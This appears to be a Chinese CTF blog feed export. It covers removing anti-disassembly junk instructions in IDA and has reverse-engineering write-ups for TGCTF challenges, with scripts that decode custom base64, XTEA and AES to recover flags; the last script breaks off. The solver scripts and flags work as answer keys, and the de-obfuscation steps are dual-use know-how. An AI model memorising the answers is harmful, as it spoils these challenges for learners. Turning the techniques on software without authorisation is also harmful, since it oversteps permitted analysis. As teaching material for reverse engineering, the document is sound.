class="hljs-number">0xfb</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x05</span>&#125;,<br>    &#123;<span class="hljs-number">0x2b</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x99</span>&#125;,<br>    &#123;<span class="hljs-number">0x9c</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>&#125;,<br>    &#123;<span class="hljs-number">0xe4</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0xa6</span>&#125;,<br>    &#123;<span class="hljs-number">0x47</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0xa8</span>&#125;,<br>    &#123;<span class="hljs-number">0x68</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x35</span>&#125;,<br>    &#123;<span class="hljs-number">0x1e</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x87</span>&#125;,<br>    &#123;<span class="hljs-number">0xd4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x9e</span>&#125;,<br>    &#123;<span class="hljs-number">0xea</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xa1</span>&#125;,<br>    &#123;<span class="hljs-number">0xe0</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0xe3</span>&#125;,<br>    &#123;<span class="hljs-number">0x1d</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x6f</span>&#125;,<br>    &#123;<span class="hljs-number">0xd5</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x51</span>&#125;,<br>    &#123;<span class="hljs-number">0x8d</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xd8</span>&#125;,<br>    &#123;<span class="hljs-number">0x0a</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xb0</span>&#125;,<br>    &#123;<span class="hljs-number">0x89</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x84</span>&#125;,<br>    &#123;<span class="hljs-number">0x18</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xcb</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x48</span>&#125;<br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>加密</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花指令</title>
    <link href="/2025/04/29/hua/"/>
    <url>/2025/04/29/hua/</url>
    
    <content type="html"><![CDATA[<p>花指令原理就是在真实代码中插入一些垃圾代码的同时还保证原有程序的正确执行, 而程序无法很好地反编译</p><h3 id="jz-jnz-指令"><a href="#jz-jnz-指令" class="headerlink" title="jz&#x2F;jnz 指令"></a>jz&#x2F;jnz 指令</h3><p>1.<br><code>jz</code>(jump if zero) 指令的本质：如果ZF&#x3D;1(前一条指令的结果为0)则跳转<br><code>jnz</code>(jump if not zero) 指令的本质：如果ZF&#x3D;0(前一条指令的结果不为0)则跳转<br>连续两条<code>jn、jnz</code>指令且跳转到同一个地址构造出无条件跳转，但 ida 不能正常识别<br>ida 打开有飘红的地方<br><img src="/../images/8/h1.png"><br>看汇编，这个地方有两条跳转指令，jn和jnz，跳转的地方是同一个地址<br><img src="/../images/8/h2.png"><br>下面的 mov 指令实际上6个字节，直接 nop 可能会 nop 多，所以先 <code>U</code>(undefine)一下看到更细的汇编再 nop<br><img src="/../images/8/h3.png"><br>把 jn&#x2F;jnz 指令其中一条改成 nop，另一条改成 jmp，直接跳转到后面的代码<br><img src="/../images/8/h4.png"><br><img src="/../images/8/h5.png"><br>最后在标签的位置(loc_413364) <code>U</code>一下，<code>P</code>(变成函数)一下，就修好了<br><img src="/../images/8/h6.png"><br><img src="/../images/8/h7.png"></p><ol start="2"><li>反编译失败，Tab 切换到汇编<br>在 下一条指令即 mov 处 <code>U</code><br><img src="/../images/8/h10.png"><br>在 跳转到的地方即 unk_41213F 处 <code>C</code><br><img src="/../images/8/h11.png"><br>又多出来两条新的jz jnz，重复上述步骤<br><img src="/../images/8/h12.png"><br>所有 jz jnz 出来之后，把这部分代码块都 nop 掉，再在最开始的标签处 <code>U</code> <code>P</code>，就能修复了<br><img src="/../images/8/h13.png"><br><img src="/../images/8/h14.png"><br>最后f5 就可以了<br><img src="/../images/8/h15.png"></li></ol><h3 id="xor-test-jz-jnz-指令"><a href="#xor-test-jz-jnz-指令" class="headerlink" title="xor test jz&#x2F;jnz 指令"></a>xor test jz&#x2F;jnz 指令</h3><p><img src="/../images/8/h17.png"><br><code>xor ebx,ebx</code> 将 ebx 清零，设置 ZF&#x3D;1<br><code>test ebx,ebx</code> 测试 ebx 的值，实际执行 ebx AND ebx ，结果为0,保持 ZF &#x3D;1<br><code>jnz short near ptr byte_412AC9</code> 若 ZF&#x3D;0,则跳转到 byte_412AC9，但此时 ZF&#x3D;1，条件不满足，继续执行下一条指令<br><code>jz short loc_412ACA</code>由于 ZF&#x3D;1，跳转到 loc_412ACA<br>所以这种结构的花指令必定会执行 jz 跳转，去花的话就将从 xor 到 jz跳转到的地方 之间的指令都 nop 掉<br><img src="/../images/8/h18.png"></p><h3 id="call-retn-指令"><a href="#call-retn-指令" class="headerlink" title="call-retn 指令"></a>call-retn 指令</h3><p>call指令的本质：push 下一条指令地址(函数返回地址)然后jmp 函数地址<br>ret指令的本质：pop eip</p><p>函数反编译失败，查看汇编<br><img src="/../images/8/h8.png"></p><ul><li>将 call 的下一条指令地址（0x412307）压入堆栈</li><li>反汇编器会尝试从 0x412307 开始解析指令，但此处被插入的 0xE8（call 的操作码）误导，导致后续代码解析错误<br><code>add [esp+0F0h+var_F0], 8</code> </li><li>实际操作：var_F0 是 IDA 生成的变量名，表示偏移 -0xF0，因此 esp+0F0h+var_F0 &#x3D; esp</li><li>等效代码：add [esp], 8，即将栈顶的返回地址（原为 0x412307）加 8，修改为 0x41230F<br>retn 的跳转:弹出修改后的返回地址 0x41230F，跳转到此处继续执行</li><li>把 call 到 0x41230F 的代码都 nop 掉<br><img src="/../images/8/h9.png">  </li><li>最后在 sub_4122B0 处 <code>U</code> <code>P</code> <code>F5</code>，就能修复了</li></ul><p>或者也可以动调看 rip&#x2F;eip 查看执行流程去花</p><h3 id="call-5-指令"><a href="#call-5-指令" class="headerlink" title="call $+5 指令"></a>call $+5 指令</h3><ul><li>$ 一般表示当前指令的起始地址</li><li>+5 表示在当前地址增加 5 个字节</li><li>一般一条 call 指令占用 5 个字节（1 字节操作码 0xE8 + 4 字节相对偏移量）</li><li>所以，$+5 指向的正是紧跟在 call $+5 这条指令之后的那条指令，但问题在于： call 指令执行时会把它的下一条指令的地址压入堆栈（作为返回地址），这个被压入堆栈的地址，恰恰也是 $+5 指向的位置，恶意代码编写者会在 call $+5 之后紧接着放置一些无效指令，扰乱反汇编，因此要把这部分指令 nop 掉<br><img src="/../images/8/h19.png"><br><img src="/../images/8/h20.png"><br>然后把 main 函数全部 U 掉，在函数头的地方 P 一下，f5反编译即可</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TGCTF Reverse 方向复现</title>
    <link href="/2025/04/27/tgctf/"/>
    <url>/2025/04/27/tgctf/</url>
    
    <content type="html"><![CDATA[<h3 id="base-64"><a href="#base-64" class="headerlink" title="base 64"></a>base 64</h3><p>变种 base64</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs py">custom_table = <span class="hljs-string">&quot;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;</span><br>table_dict = &#123;char: idx <span class="hljs-keyword">for</span> idx, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(custom_table)&#125;<br><br>encoded_str = <span class="hljs-string">&quot;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=&quot;</span><br><br><span class="hljs-comment"># 移除末尾等号并计算填充数</span><br>pad_count = encoded_str.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>encoded_clean = encoded_str.rstrip(<span class="hljs-string">&#x27;=&#x27;</span>)<br><span class="hljs-comment">#rstrip()删除字符串结尾的指定字符 lstrip()删除字符串开开头的指定字符</span><br>decoded_bytes = []<br><br><span class="hljs-comment"># 每4字符一组解码</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(encoded_clean), <span class="hljs-number">4</span>):<br>    chunk = encoded_clean[i:i+<span class="hljs-number">4</span>].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;A&#x27;</span>)  <span class="hljs-comment">#填充不影响最终结果</span><br>    <br>    <span class="hljs-comment">#计算每个字符对应的6位值</span><br>    indexes = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chunk:<br>        <span class="hljs-keyword">if</span> c == <span class="hljs-string">&#x27;=&#x27;</span>:<br>            indexes.append(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            x = (table_dict[c] - <span class="hljs-number">24</span>) % <span class="hljs-number">64</span><br>            indexes.append(x)<br>    <br>    <span class="hljs-comment"># 组合成3字节</span><br>    byte1 = (indexes[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">2</span>) | (indexes[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">4</span>)<br>    byte2 = ((indexes[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">4</span>) | (indexes[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">2</span>)<br>    byte3 = ((indexes[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">0x03</span>) &lt;&lt; <span class="hljs-number">6</span>) | indexes[<span class="hljs-number">3</span>]<br>    <br>    decoded_bytes.extend([byte1, byte2, byte3])<br><br><span class="hljs-comment"># 根据填充数去除多余字节</span><br><span class="hljs-keyword">if</span> pad_count:<br>    decoded_bytes = decoded_bytes[:-pad_count]<br><span class="hljs-comment">#如果原始编码字符中有填充的等号，根据 pad_count 去除解码结果中多余的字节</span><br><br><span class="hljs-comment"># 转换为字符串并拼接Flag</span><br>flag_content = <span class="hljs-built_in">bytes</span>(decoded_bytes).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;HZNUCTF&#123;&#123;<span class="hljs-subst">&#123;flag_content&#125;</span>&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到flag<code>HZNUCTF&#123;ad162c-2d94-434d-9222-b65dc76a32&#125;</code></p><h3 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h3><ol><li>种子确定，拿到key</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iomanip&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-number">0x7e9u</span>); <span class="hljs-comment">// 初始化随机数种子</span><br><br>    <span class="hljs-comment">// 生成四个随机数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-type">uint32_t</span> value = <span class="hljs-built_in">rand</span>() &amp; <span class="hljs-number">0xFFFF</span>; <span class="hljs-comment">// 取低 16 位</span><br>        std::cout &lt;&lt; <span class="hljs-string">&quot;Generated: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; value &lt;&lt; std::endl;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Generated: 0x19fb</span><br><span class="hljs-comment">// Generated: 0x3bba</span><br><span class="hljs-comment">// Generated: 0x4f59</span><br><span class="hljs-comment">// Generated: 0x1217</span><br></code></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">0x9E3779B9</span>, sum = delta * (<span class="hljs-number">-32</span>);<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x19f8</span>,<span class="hljs-number">0x11be</span>,<span class="hljs-number">0x991</span>,<span class="hljs-number">0x3418</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">0x8ccb2324</span>,<span class="hljs-number">0x9a7741a</span>,<span class="hljs-number">0xfb3c678d</span>,<span class="hljs-number">0xf6083a79</span>,<span class="hljs-number">0xf1cc241b</span>,<span class="hljs-number">0x39fa59f2</span>,<span class="hljs-number">0xf2abe1cc</span>,<span class="hljs-number">0x17189f72</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">6</span>; i&gt;=<span class="hljs-number">0</span>; i-=<span class="hljs-number">1</span>)&#123;  <span class="hljs-comment">//倒着解密</span><br>        <span class="hljs-built_in">decrypt</span>(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;  <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">3</span>; m&gt;=<span class="hljs-number">0</span>; m--) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到flag<code>HZNUCTF&#123;ae6-9f57-4b74-b423-98eb&#125;</code></p><h3 id="水果忍者"><a href="#水果忍者" class="headerlink" title="水果忍者"></a>水果忍者</h3><ol><li>Unity游戏的核心逻辑通常由C#脚本编写，编译后会被打包到 Assembly-CSharp.dll;该文件位于游戏目录的 &lt;游戏名&gt;_Data\Managed\ 下,如本题在 <strong>\水果忍者\Fruit Ninja_Data\Managed\Assembly-CSharp.dll</strong> 中</li><li>用<code>dnSpy</code>打开 Assembly-CSharp.dll,在 <strong>GameManager</strong> 里面找到：<br><img src="/../images/7/sg1.png"><br>在 Decrypt 里看到是 AES 加密，而密文、密钥、iv 在下面都能找到<br><img src="/../images/7/sg2.png"><br>CyberChef 解密<br><img src="/../images/7/sg3.png"><br>flag为<code>HZNUCTF&#123;de20-70dd-4e62-b8d0-06e&#125;</code></li></ol><h3 id="蛇年的本名语言"><a href="#蛇年的本名语言" class="headerlink" title="蛇年的本名语言"></a>蛇年的本名语言</h3><ol start="0"><li><code>pyc</code>: 脚本文件编译得到的字节码, 二进制文件<br><code>pyd</code>: 基本的Windows DLL文件, python的动态链接库</li><li>用 <code>pyinstxtractor</code> 解包 exe 文件,把 pyinstxtractor.py 和 output.exe 放在同一目录下，执行</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python pyinstxtractor.py output.exe<br></code></pre></td></tr></table></figure><p>解包后发现是 pyc，用 <a href="https://tool.lu/pyc">https://tool.lu/pyc</a> 解密 output.pyc，得到的代码变量命名被混淆<br>稍微修改一下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to HZNUCTF!!!&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Plz input the flag:&quot;</span>)<br>a = <span class="hljs-built_in">input</span>()<br>b = Counter(a)<br>c = <span class="hljs-string">&quot;&quot;</span>.join((<span class="hljs-built_in">str</span>(b[v]) <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> a))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ans1: &quot;</span>, _end_=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-keyword">if</span> c != <span class="hljs-string">&quot;111111116257645365477364777645752361&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong_wrong!!!&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br>x = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> b[v] &gt; <span class="hljs-number">0</span>:<br>        x += v + <span class="hljs-built_in">str</span>(b[v])<br>        b[v] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        enc = [<span class="hljs-built_in">ord</span>(v) <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> x]<br>        n = [<br>         <span class="hljs-number">7</span> * enc[<span class="hljs-number">0</span>] == <span class="hljs-number">504</span>,<br>         <span class="hljs-number">9</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> * enc[<span class="hljs-number">1</span>] == <span class="hljs-number">403</span>,<br>         <span class="hljs-number">2</span> * enc[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> * enc[<span class="hljs-number">1</span>] + <span class="hljs-number">10</span> * enc[<span class="hljs-number">2</span>] == 